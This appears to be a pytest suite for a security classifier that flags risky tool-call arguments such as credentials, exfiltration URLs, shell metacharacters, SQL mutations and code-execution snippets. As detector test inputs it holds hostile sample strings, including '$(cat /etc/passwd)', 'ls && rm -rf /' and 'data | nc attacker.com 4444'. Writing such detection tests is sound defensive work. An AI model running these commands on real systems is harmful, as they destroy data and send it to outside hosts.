"""
Tests for the Argument Value Classifier (sdk/aegivis/security/arg_classifier.py).

All tests are value-based — no tool names, no parameter names, no heuristics.
"""
from __future__ import annotations

import pytest

from aegivis.security.arg_classifier import (
    ALL_SIGNALS,
    ArgClassifier,
    ArgSignal,
    ClassifierConfig,
    Signal,
    _credential_preview,
    _has_shell_danger,
    _is_credential,
    _is_email_shaped,
    _is_file_path,
    _is_network_destination,
    _is_sql_mutation,
    _safe_preview,
    _shannon_entropy,
)


# ---------------------------------------------------------------------------
# Shannon entropy
# ---------------------------------------------------------------------------


class TestShannonEntropy:
    def test_empty_string(self):
        assert _shannon_entropy("") == 0.0

    def test_single_char(self):
        assert _shannon_entropy("a") == 0.0

    def test_uniform_low_entropy(self):
        # "aaaa…" → entropy ≈ 0
        assert _shannon_entropy("aaaaaaaaaa") < 0.1

    def test_random_high_entropy(self):
        # base64-like string — should be well above 4.5
        val = "aB3$kL9mP2qR5sT8vW1xY4z7"
        assert _shannon_entropy(val) > 4.0

    def test_human_text_moderate_entropy(self):
        # Prose has moderate entropy (~3-4 bpc)
        val = "the quick brown fox jumps over the lazy dog"
        h = _shannon_entropy(val)
        assert 3.0 <= h <= 4.5

    def test_known_value(self):
        # "ab" → p(a)=p(b)=0.5 → H = 1.0 bpc
        assert abs(_shannon_entropy("ab") - 1.0) < 1e-9


# ---------------------------------------------------------------------------
# Email detection
# ---------------------------------------------------------------------------


class TestIsEmailShaped:
    def test_standard_email(self):
        assert _is_email_shaped("user@example.com")

    def test_subdomain_email(self):
        assert _is_email_shaped("alice@mail.company.org")

    def test_no_at_sign(self):
        assert not _is_email_shaped("notanemail.com")

    def test_multiple_at_signs(self):
        assert not _is_email_shaped("a@b@c.com")

    def test_empty_local(self):
        assert not _is_email_shaped("@domain.com")

    def test_empty_domain(self):
        assert not _is_email_shaped("user@")

    def test_single_segment_domain(self):
        # domain with no dot → not a valid email structure
        assert not _is_email_shaped("user@localhost")

    def test_domain_with_empty_segment(self):
        # "user@domain..com" has empty segment
        assert not _is_email_shaped("user@domain..com")


# ---------------------------------------------------------------------------
# Network destination detection
# ---------------------------------------------------------------------------


class TestIsNetworkDestination:
    def setup_method(self):
        self.schemes = frozenset({"http", "https", "ftp", "ftps", "ws", "wss", "grpc", "grpcs"})

    def test_http_url(self):
        assert _is_network_destination("http://example.com/path", self.schemes)

    def test_https_url(self):
        assert _is_network_destination("https://api.service.io/v1", self.schemes)

    def test_ftp_url(self):
        assert _is_network_destination("ftp://files.example.com", self.schemes)

    def test_ws_url(self):
        assert _is_network_destination("ws://stream.example.com", self.schemes)

    def test_bare_ipv4(self):
        assert _is_network_destination("192.168.1.1", self.schemes)

    def test_bare_ipv4_with_port(self):
        assert _is_network_destination("10.0.0.1:8080", self.schemes)

    def test_bare_ipv6(self):
        assert _is_network_destination("::1", self.schemes)

    def test_plain_text_not_network(self):
        assert not _is_network_destination("hello world", self.schemes)

    def test_unknown_scheme(self):
        assert not _is_network_destination("redis://localhost", self.schemes)

    def test_url_without_netloc(self):
        # scheme-only without netloc
        assert not _is_network_destination("https://", self.schemes)

    def test_relative_path_not_network(self):
        assert not _is_network_destination("/etc/passwd", self.schemes)


# ---------------------------------------------------------------------------
# Shell metacharacter detection
# ---------------------------------------------------------------------------


class TestHasShellDanger:
    def setup_method(self):
        self.seqs = frozenset({"$(", "`", " && ", " || ", " | ", "; "})

    def test_command_substitution_dollar(self):
        assert _has_shell_danger("$(cat /etc/passwd)", self.seqs)

    def test_backtick_substitution(self):
        assert _has_shell_danger("`id`", self.seqs)

    def test_shell_and(self):
        assert _has_shell_danger("ls && rm -rf /", self.seqs)

    def test_shell_or(self):
        assert _has_shell_danger("true || false", self.seqs)

    def test_pipe(self):
        assert _has_shell_danger("cat /etc/passwd | grep root", self.seqs)

    def test_command_separator(self):
        assert _has_shell_danger("echo hi; rm file", self.seqs)

    def test_safe_string(self):
        assert not _has_shell_danger("hello world", self.seqs)

    def test_safe_string_with_ampersands_no_spaces(self):
        # "&&" without surrounding spaces — not in our frozenset
        assert not _has_shell_danger("https://example.com?a=1&&b=2", self.seqs)


# ---------------------------------------------------------------------------
# SQL mutation detection (optional sqlglot dependency)
# ---------------------------------------------------------------------------


class TestIsSqlMutation:
    def test_insert(self):
        try:
            import sqlglot  # noqa: F401
        except ImportError:
            pytest.skip("sqlglot not installed")
        assert _is_sql_mutation("INSERT INTO users VALUES (1, 'bob')")

    def test_update(self):
        try:
            import sqlglot  # noqa: F401
        except ImportError:
            pytest.skip("sqlglot not installed")
        assert _is_sql_mutation("UPDATE users SET name='alice' WHERE id=1")

    def test_delete(self):
        try:
            import sqlglot  # noqa: F401
        except ImportError:
            pytest.skip("sqlglot not installed")
        assert _is_sql_mutation("DELETE FROM sessions WHERE expired=true")

    def test_drop(self):
        try:
            import sqlglot  # noqa: F401
        except ImportError:
            pytest.skip("sqlglot not installed")
        assert _is_sql_mutation("DROP TABLE audit_events")

    def test_select_is_not_mutation(self):
        try:
            import sqlglot  # noqa: F401
        except ImportError:
            pytest.skip("sqlglot not installed")
        assert not _is_sql_mutation("SELECT * FROM users WHERE id = 1")

    def test_non_sql_safe(self):
        assert not _is_sql_mutation("hello world, this is not SQL")

    def test_without_sqlglot_returns_false(self, monkeypatch):
        import sys
        # Temporarily hide sqlglot if available
        monkeypatch.setitem(sys.modules, "sqlglot", None)
        assert not _is_sql_mutation("DELETE FROM t")


# ---------------------------------------------------------------------------
# File path detection
# ---------------------------------------------------------------------------


class TestIsFilePath:
    def setup_method(self):
        self.prefixes = frozenset({"/", "~/", "./", "../", "C:\\", "D:\\", "\\\\"})

    def test_absolute_unix(self):
        assert _is_file_path("/etc/passwd", self.prefixes)

    def test_home_relative(self):
        assert _is_file_path("~/documents/file.txt", self.prefixes)

    def test_current_dir(self):
        assert _is_file_path("./scripts/run.sh", self.prefixes)

    def test_parent_dir(self):
        assert _is_file_path("../configs/prod.yaml", self.prefixes)

    def test_windows_drive(self):
        assert _is_file_path("C:\\Users\\admin\\file.txt", self.prefixes)

    def test_unc_path(self):
        assert _is_file_path("\\\\server\\share", self.prefixes)

    def test_plain_filename_not_path(self):
        assert not _is_file_path("output.txt", self.prefixes)

    def test_url_not_path(self):
        assert not _is_file_path("https://example.com", self.prefixes)


# ---------------------------------------------------------------------------
# Credential detection
# ---------------------------------------------------------------------------


class TestIsCredential:
    def test_known_prefix_sk_dash(self):
        assert _is_credential("sk-1234567890abcdef", 24, 4.5, frozenset({"sk-"}))

    def test_known_prefix_bearer(self):
        assert _is_credential("Bearer eyJhbGciOiJIUzI1NiJ9", 24, 4.5, frozenset({"Bearer "}))

    def test_high_entropy_long(self):
        # 40-char base64-like value
        val = "aB3kL9mP2qR5sT8vW1xY4z7NcE6fH0jQ"
        assert _is_credential(val, 24, 4.5, frozenset())

    def test_short_string_not_credential(self):
        assert not _is_credential("short", 24, 4.5, frozenset())

    def test_low_entropy_long_string_not_credential(self):
        val = "a" * 50  # all same char → entropy = 0
        assert not _is_credential(val, 24, 4.5, frozenset())

    def test_uuid_not_credential(self):
        # UUIDs have ~3.9 bpc → below 4.5 threshold
        uuid = "550e8400-e29b-41d4-a716-446655440000"
        assert not _is_credential(uuid, 24, 4.5, frozenset())

    def test_github_token_prefix(self):
        assert _is_credential("ghp_abc123", 24, 4.5, frozenset({"ghp_"}))

    def test_aws_key_prefix(self):
        assert _is_credential("AKIAIOSFODNN7EXAMPLE", 24, 4.5, frozenset({"AKIA"}))


# ---------------------------------------------------------------------------
# Preview helpers
# ---------------------------------------------------------------------------


class TestPreviewHelpers:
    def test_safe_preview_short(self):
        assert _safe_preview("short") == "short"

    def test_safe_preview_truncated(self):
        result = _safe_preview("a" * 50)
        assert result.endswith("…")
        assert len(result) == 41  # 40 chars + ellipsis

    def test_credential_preview_format(self):
        result = _credential_preview("sk-verylongsecretkey123456789")
        assert result.startswith("sk-ver…")
        assert "chars" in result


# ---------------------------------------------------------------------------
# ArgClassifier — full integration
# ---------------------------------------------------------------------------


class TestArgClassifier:
    def setup_method(self):
        self.clf = ArgClassifier()

    # ── Email ────────────────────────────────────────────────────────────

    def test_email_in_positional_arg(self):
        sigs = self.clf.classify_call(args=("attacker@evil.com",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.EMAIL_DESTINATION in types

    def test_email_in_keyword_arg(self):
        sigs = self.clf.classify_call(args=(), kwargs={"recipient": "bob@company.org"})
        types = {s.signal for s in sigs}
        assert Signal.EMAIL_DESTINATION in types

    def test_email_path_label(self):
        sigs = self.clf.classify_call(args=("x@y.com",), kwargs={})
        email_sig = next(s for s in sigs if s.signal == Signal.EMAIL_DESTINATION)
        assert email_sig.path == "args[0]"

    def test_email_kwarg_path_label(self):
        sigs = self.clf.classify_call(args=(), kwargs={"to": "x@y.com"})
        email_sig = next(s for s in sigs if s.signal == Signal.EMAIL_DESTINATION)
        assert "to" in email_sig.path

    # ── Credential ───────────────────────────────────────────────────────

    def test_credential_sk_prefix(self):
        sigs = self.clf.classify_call(args=("sk-testkey12345",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.CREDENTIAL in types

    def test_credential_high_entropy(self):
        val = "aB3kL9mP2qR5sT8vW1xY4z7NcE6fH0jQ"
        sigs = self.clf.classify_call(args=(val,), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.CREDENTIAL in types

    def test_no_credential_for_normal_text(self):
        sigs = self.clf.classify_call(args=("hello world",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.CREDENTIAL not in types

    def test_credential_preview_truncated(self):
        sigs = self.clf.classify_call(args=("sk-abcdefghijklmno",), kwargs={})
        cred_sig = next(s for s in sigs if s.signal == Signal.CREDENTIAL)
        # Preview never reveals full value
        assert "sk-abc" in cred_sig.preview
        assert len(cred_sig.preview) < 40

    # ── Network destination ───────────────────────────────────────────────

    def test_network_url(self):
        sigs = self.clf.classify_call(args=("https://evil.com/exfil",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.NETWORK_DESTINATION in types

    def test_bare_ip(self):
        sigs = self.clf.classify_call(args=("1.2.3.4",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.NETWORK_DESTINATION in types

    def test_no_network_for_plain_text(self):
        sigs = self.clf.classify_call(args=("just some text",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.NETWORK_DESTINATION not in types

    # ── Shell metacharacters ──────────────────────────────────────────────

    def test_shell_command_substitution(self):
        sigs = self.clf.classify_call(args=("$(cat /etc/passwd)",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.SHELL_METACHAR in types

    def test_shell_pipe(self):
        sigs = self.clf.classify_call(args=("data | nc attacker.com 4444",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.SHELL_METACHAR in types

    def test_safe_text_no_shell(self):
        sigs = self.clf.classify_call(args=("print('hello')",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.SHELL_METACHAR not in types

    # ── File path ─────────────────────────────────────────────────────────

    def test_absolute_path(self):
        sigs = self.clf.classify_call(args=("/etc/shadow",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.FILE_PATH in types

    def test_home_path(self):
        sigs = self.clf.classify_call(args=("~/secrets.env",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.FILE_PATH in types

    def test_relative_path(self):
        sigs = self.clf.classify_call(args=("./run.sh",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.FILE_PATH in types

    # ── Bulk target ───────────────────────────────────────────────────────

    def test_bulk_email_list(self):
        emails = [f"user{i}@example.com" for i in range(25)]
        sigs = self.clf.classify_call(args=(emails,), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.BULK_TARGET in types

    def test_small_list_no_bulk(self):
        emails = ["a@b.com", "c@d.com"]
        sigs = self.clf.classify_call(args=(emails,), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.BULK_TARGET not in types

    def test_bulk_url_list(self):
        urls = [f"https://target{i}.com" for i in range(25)]
        sigs = self.clf.classify_call(args=(urls,), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.BULK_TARGET in types

    # ── Large payload ─────────────────────────────────────────────────────

    def test_large_payload(self):
        huge = "x" * 200_000
        sigs = self.clf.classify_call(args=(huge,), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.LARGE_PAYLOAD in types

    def test_large_payload_no_further_checks(self):
        # Large payload short-circuits — should NOT also flag as credential
        # even if it happened to be high-entropy (it's all 'x', so low entropy)
        huge = "x" * 200_000
        sigs = self.clf.classify_call(args=(huge,), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.CREDENTIAL not in types

    # ── Nested traversal ──────────────────────────────────────────────────

    def test_nested_dict_email(self):
        sigs = self.clf.classify_call(
            args=(),
            kwargs={"payload": {"inner": {"target": "evil@attacker.com"}}},
        )
        types = {s.signal for s in sigs}
        assert Signal.EMAIL_DESTINATION in types

    def test_nested_list_credential(self):
        sigs = self.clf.classify_call(
            args=([["sk-secret123456789012345"],],),
            kwargs={},
        )
        types = {s.signal for s in sigs}
        assert Signal.CREDENTIAL in types

    def test_max_depth_not_exceeded(self):
        # Build a deeply nested dict that exceeds max_traversal_depth
        deep: dict = {}
        node = deep
        for i in range(10):
            node["k"] = {}
            node = node["k"]
        node["email"] = "trap@attacker.com"
        # Should not raise; may or may not find email depending on depth limit
        sigs = self.clf.classify_call(args=(), kwargs={"deep": deep})
        # Just ensure no exception
        assert isinstance(sigs, list)

    # ── Type safety ───────────────────────────────────────────────────────

    def test_integers_produce_no_signals(self):
        sigs = self.clf.classify_call(args=(42, 3.14, True, None), kwargs={})
        assert sigs == []

    def test_empty_string_produces_no_signals(self):
        sigs = self.clf.classify_call(args=("",), kwargs={})
        assert sigs == []

    def test_empty_call(self):
        sigs = self.clf.classify_call(args=(), kwargs={})
        assert sigs == []

    # ── Name independence ─────────────────────────────────────────────────
    # The classifier must emit the same signals regardless of the kwarg name
    # used to pass a value.

    def test_credential_in_arbitrary_kwarg_names(self):
        secret = "sk-abcdefghijklmnopq"
        for param_name in ("x", "token", "api_key", "value", "arg1", "z99"):
            sigs = self.clf.classify_call(args=(), kwargs={param_name: secret})
            types = {s.signal for s in sigs}
            assert Signal.CREDENTIAL in types, f"missed credential in kwarg '{param_name}'"

    def test_email_in_arbitrary_kwarg_names(self):
        addr = "victim@target.com"
        for param_name in ("a", "to", "dest", "recipient", "x999", "q"):
            sigs = self.clf.classify_call(args=(), kwargs={param_name: addr})
            types = {s.signal for s in sigs}
            assert Signal.EMAIL_DESTINATION in types, f"missed email in kwarg '{param_name}'"

    # ── ArgSignal ─────────────────────────────────────────────────────────

    def test_arg_signal_to_dict(self):
        sig = ArgSignal(signal=Signal.CREDENTIAL, path="args[0]", preview="sk-abc… (20 chars)")
        d = sig.to_dict()
        assert d == {"signal": "credential", "path": "args[0]", "preview": "sk-abc… (20 chars)"}

    # ── Custom config ─────────────────────────────────────────────────────

    def test_custom_credential_prefix(self):
        cfg = ClassifierConfig(credential_prefixes=frozenset({"myapp-"}))
        clf = ArgClassifier(cfg)
        sigs = clf.classify_call(args=("myapp-supersecret",), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.CREDENTIAL in types

    def test_custom_entropy_threshold(self):
        # UUID "550e8400-e29b-41d4-a716-446655440000" has entropy ≈ 3.39 bpc.
        # Default threshold (4.5) does NOT flag it.  Lower it to 3.0 and it
        # should be flagged (since 3.39 > 3.0 and length 36 > min_length 20).
        cfg = ClassifierConfig(
            credential_entropy_threshold=3.0,
            credential_min_length=20,
            credential_prefixes=frozenset(),
        )
        clf = ArgClassifier(cfg)
        uuid = "550e8400-e29b-41d4-a716-446655440000"
        sigs = clf.classify_call(args=(uuid,), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.CREDENTIAL in types

    def test_custom_bulk_threshold(self):
        # Default bulk threshold is 20; set it lower to 5
        cfg = ClassifierConfig(bulk_target_min_items=5)
        clf = ArgClassifier(cfg)
        emails = [f"u{i}@x.com" for i in range(6)]
        sigs = clf.classify_call(args=(emails,), kwargs={})
        types = {s.signal for s in sigs}
        assert Signal.BULK_TARGET in types

    # ── Code execution ────────────────────────────────────────────────────

    def test_code_execution_subprocess_import(self):
        sigs = self.clf.classify_call(
            args=("import subprocess\nsubprocess.run(['ls'])",), kwargs={}
        )
        assert Signal.CODE_EXECUTION in {s.signal for s in sigs}

    def test_code_execution_os_import(self):
        sigs = self.clf.classify_call(args=("import os\nos.system('id')",), kwargs={})
        assert Signal.CODE_EXECUTION in {s.signal for s in sigs}

    def test_code_execution_eval_call(self):
        sigs = self.clf.classify_call(args=("eval('__import__(\"os\")')",), kwargs={})
        assert Signal.CODE_EXECUTION in {s.signal for s in sigs}

    def test_code_execution_exec_call(self):
        sigs = self.clf.classify_call(args=("exec('import socket')",), kwargs={})
        assert Signal.CODE_EXECUTION in {s.signal for s in sigs}

    def test_code_execution_from_import(self):
        sigs = self.clf.classify_call(
            args=("from subprocess import run",), kwargs={}
        )
        assert Signal.CODE_EXECUTION in {s.signal for s in sigs}

    def test_safe_python_no_code_execution_signal(self):
        sigs = self.clf.classify_call(
            args=("x = 1 + 2\nprint(x)",), kwargs={}
        )
        assert Signal.CODE_EXECUTION not in {s.signal for s in sigs}

    def test_non_python_no_code_execution_signal(self):
        # Plain English sentence — SyntaxError → returns False → no signal
        sigs = self.clf.classify_call(args=("hello world this is text",), kwargs={})
        assert Signal.CODE_EXECUTION not in {s.signal for s in sigs}

    def test_custom_danger_modules(self):
        cfg = ClassifierConfig(code_danger_modules=frozenset({"mymodule"}))
        clf = ArgClassifier(cfg)
        sigs = clf.classify_call(args=("import mymodule",), kwargs={})
        assert Signal.CODE_EXECUTION in {s.signal for s in sigs}

    # ── ALL_SIGNALS constant ──────────────────────────────────────────────

    def test_all_signals_is_frozenset(self):
        assert isinstance(ALL_SIGNALS, frozenset)

    def test_all_signals_contains_expected(self):
        expected = {
            Signal.EMAIL_DESTINATION,
            Signal.CREDENTIAL,
            Signal.NETWORK_DESTINATION,
            Signal.SHELL_METACHAR,
            Signal.SQL_MUTATION,
            Signal.FILE_PATH,
            Signal.BULK_TARGET,
            Signal.LARGE_PAYLOAD,
            Signal.CODE_EXECUTION,
        }
        assert expected == ALL_SIGNALS
